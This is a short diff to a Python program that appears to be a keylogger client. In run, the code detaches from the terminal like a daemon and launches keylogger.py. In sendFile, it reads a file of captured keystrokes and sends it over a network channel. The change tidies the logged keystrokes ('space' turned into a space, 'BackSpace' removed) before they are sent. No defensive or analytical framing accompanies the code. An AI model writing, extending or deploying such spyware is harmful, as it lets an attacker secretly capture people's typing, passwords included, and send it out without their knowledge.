@@ -199,7 +199,7 @@ def sendFile(dataFile,  keyLoc, filename):
           #send this filename
         
         with open(dataFile, 'r') as file:
-            data = file.read().replace('\n', '')
+            data = file.read().replace('\n', '').replace('space', ' ').replace('BackSpace',  '')
         
         chan.sendall(data.encode('utf-8'))
     
@@ -245,6 +245,7 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     sys.stdout.flush() 
     sys.stderr.flush()
 
+    
     keylog(cwd+'/keylogger.py') # keylogger.py is located in the working directory of the client/daemon
 
     time.sleep(20)
